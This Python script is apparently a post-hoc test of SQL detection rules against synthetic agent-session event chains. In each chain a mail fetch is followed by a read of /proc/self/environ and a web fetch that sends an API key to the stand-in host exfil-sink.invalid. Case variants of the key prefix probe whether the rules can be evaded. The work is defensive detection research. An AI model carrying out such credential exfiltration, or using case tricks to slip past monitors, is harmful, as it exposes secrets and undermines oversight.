"""Post-hoc check (2026-11-16, not pre-registered), follow-up to mixed_case_probe_2026_11_16.py after an external review.

Two parts, both on T8c's own code (run.py and gen_corpus.py imported read-only; nothing in the bench is modified):

A. Mixed-case key body. T8c's fixture key body is all upper-case (gen_corpus.py l.22), so the first probe's "upper" and
   "token-upper" variants were the same string. Part A uses a fixture whose body mixes case, so upper-casing only the
   constant `api03-` prefix differs from upper-casing the whole value, and runs b3, b4, c1, c2 (run.SESSION_SQL) and
   b4/c2 with every hand-SQL LIKE wrapped in lower() on direct and two-hop delegated sessions, both engines.

B. Corpus level. For seeds 20261109, 20261110, 20261111 at 2,000 sessions, regenerate T8c's corpus in memory with
   gen_corpus.gen, then score every session rule and the lower() variants on both engines twice: as planted, and with
   `api03-` upper-cased to `API03-` in the planted leg-3 web.fetch rows (the CS0067-shaped chains). Also count a6
   single-step matches.

gen_corpus.validate_columns() is skipped: it reads the OCSF 1.9.0 class JSON under
../atlas-ocsf-observables/sources/ocsf-1.9.0/classes/, which is gitignored and not on disk. As-planted scores are
compared against results/coverage.json as the check that the corpus regenerated faithfully.

  <venv from requirements.txt>/bin/python -I -B corpus_case_check_2026_11_16.py
Writes results/corpus-case-check-2026-11-16.json.
"""
import json, os, sqlite3, sys
from importlib.metadata import version

import duckdb

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import gen_corpus  # noqa: E402
import run  # noqa: E402

gen_corpus.validate_columns = lambda: None  # schema JSON not on disk; see docstring
SEEDS = [20261109, 20261110, 20261111]
BODY = "aB3xY_z9Q-kLmN0pQrStUvWx7Zq"  # synthetic mixed-case fixture body, not a credential


def lowered_sql():
    legs0, qual0 = run.LEGS_CTE, run.QUAL_CTE
    try:
        run.LEGS_CTE = legs0.replace("api_request_data LIKE", "lower(api_request_data) LIKE")
        run.QUAL_CTE = qual0.replace("l.d LIKE", "lower(l.d) LIKE")
        assert run.LEGS_CTE.count("lower(") == 3 and run.QUAL_CTE.count("lower(") == 1
        return {"b4_lowered": run.session_sql(True, False), "c2_lowered": run.session_sql(True, True)}
    finally:
        run.LEGS_CTE, run.QUAL_CTE = legs0, qual0


RULES = {**run.SESSION_SQL, **lowered_sql()}


def load(rows, cols):
    out = {}
    for eng in ("sqlite", "duckdb"):
        con = sqlite3.connect(":memory:") if eng == "sqlite" else duckdb.connect(":memory:")
        con.execute("CREATE TABLE api (" + ", ".join(
            f"{c} {'BIGINT' if c in gen_corpus.INT_COLS else 'VARCHAR'}" for c in cols) + ")")
        con.executemany(f"INSERT INTO api VALUES ({', '.join('?' * len(cols))})", [tuple(r.get(c) for c in cols) for r in rows])
        out[eng] = con
    return out


# ---- Part A -------------------------------------------------------------------------------------------------------
ACOLS = ["metadata_uid", "actor_session_uid", "delegation_parent_uid", "time_epoch", "api_operation",
         "api_request_data", "dst_endpoint_hostname"]


def ev(uid, sess, parent, t, op, data="{}", host="intranet.example"):
    return {"metadata_uid": uid, "actor_session_uid": sess, "delegation_parent_uid": parent, "time_epoch": t,
            "api_operation": op, "api_request_data": data, "dst_endpoint_hostname": host}


def part_a():
    key = "api03-" + BODY
    variants = {
        "as_planted": key,
        "prefix_upper_body_intact": "API03-" + BODY,
        "prefix_titlecase": "Api03-" + BODY,
        "whole_value_upper": key.upper(),
        "prefix_dropped": BODY,
    }
    rows, units = [], {}
    n = 0
    for lab, v in variants.items():
        for shape in ("direct", "delegated"):
            root = f"r-{lab}-{shape}"
            units[(lab, shape, "noburst")] = root
            leg23 = root if shape == "direct" else f"c-{lab}-{shape}"
            parent = None if shape == "direct" else root
            rows.append(ev(f"e{n}", root, None, 1000, "mail.fetch")); n += 1
            rows.append(ev(f"e{n}", leg23, parent, 1060, "file.read", '{"path": "/proc/self/environ"}')); n += 1
            rows.append(ev(f"e{n}", leg23, parent, 1120, "web.fetch",
                           f'{{"url": "https://exfil-sink.invalid/r?v={v}"}}', "exfil-sink.invalid")); n += 1
    # prefix-upper plus a 24-call burst to one off-allowlist host (the CS0066-style qualifier), direct only
    root = "r-prefix_upper_plus_burst-direct"
    units[("prefix_upper_body_intact", "direct", "burst")] = root
    rows.append(ev(f"e{n}", root, None, 1000, "mail.fetch")); n += 1
    rows.append(ev(f"e{n}", root, None, 1060, "file.read", '{"path": "/proc/self/environ"}')); n += 1
    rows.append(ev(f"e{n}", root, None, 1120, "web.fetch", f'{{"url": "https://exfil-sink.invalid/r?v=API03-{BODY}"}}',
                   "exfil-sink.invalid")); n += 1
    for k in range(24):
        rows.append(ev(f"e{n}", root, None, 1130 + k, "http.open", '{"url": "https://exfil-sink.invalid/c"}',
                       "exfil-sink.invalid")); n += 1
    cons = load(rows, ACOLS)
    out = {"fixture_body": BODY, "variants": variants, "fired": {}}
    for rule, sql in RULES.items():
        out["fired"][rule] = {}
        for eng, con in cons.items():
            hit = {x[0] for x in con.execute(sql).fetchall()}
            out["fired"][rule][eng] = {"|".join(k): (u in hit) for k, u in units.items()}
    return out


# ---- Part B -------------------------------------------------------------------------------------------------------
def mutate(rows):
    out, k = [], 0
    for r in rows:
        if r["is_planted"] and r["api_operation"] == "web.fetch" and "api03-" in (r["api_request_data"] or ""):
            r = dict(r)
            r["api_request_data"] = r["api_request_data"].replace("api03-", "API03-")
            k += 1
        out.append(r)
    return out, k


def part_b():
    a6 = run.to_api(run.compile_yaml("a6_credential_shape.yml")[-1]).replace("SELECT *", "SELECT metadata_uid", 1)
    res = {}
    for seed in SEEDS:
        rows0, truth = gen_corpus.gen(seed, 2000)
        roots = {c["root"] for c in truth["chains"].values()}
        strata = {}
        for c in truth["chains"].values():
            strata.setdefault(f"{c['chain']}-{'delegated' if c['delegated'] else 'direct'}", set()).add(c["root"])
        mutated, k = mutate(rows0)
        sres = {"mutated_rows": k}
        for label, rows in (("as_planted", rows0), ("prefix_upper", mutated)):
            cons = load(rows, gen_corpus.COLUMNS)
            lab = {}
            for rule, sql in RULES.items():
                lab[rule] = {}
                for eng, con in cons.items():
                    m = {x[0] for x in con.execute(sql).fetchall()}
                    sc = run.score(m, roots)
                    sc["recall_by_stratum"] = {s: round(len(m & v) / len(v), 4) for s, v in sorted(strata.items())}
                    lab[rule][eng] = sc
            lab["a6_single_step_matches"] = {eng: len(con.execute(a6).fetchall()) for eng, con in cons.items()}
            sres[label] = lab
        res[str(seed)] = sres
        print("seed", seed, "done", flush=True)
    return res


def main():
    out = {"status": "post-hoc, not pre-registered", "validate_columns": "skipped (schema JSON not on disk)",
           "versions": {"pySigma": version("pySigma"), "pySigma-backend-sqlite": version("pySigma-backend-sqlite"),
                        "duckdb": duckdb.__version__, "sqlite": sqlite3.sqlite_version, "python": sys.version.split()[0]},
           "part_a_mixed_case_body": part_a(), "part_b_corpus": part_b()}
    p = os.path.join(HERE, "results", "corpus-case-check-2026-11-16.json")
    with open(p, "w") as fh:
        json.dump(out, fh, indent=1, sort_keys=True)
    print(json.dumps(out["versions"]))


if __name__ == "__main__":
    main()
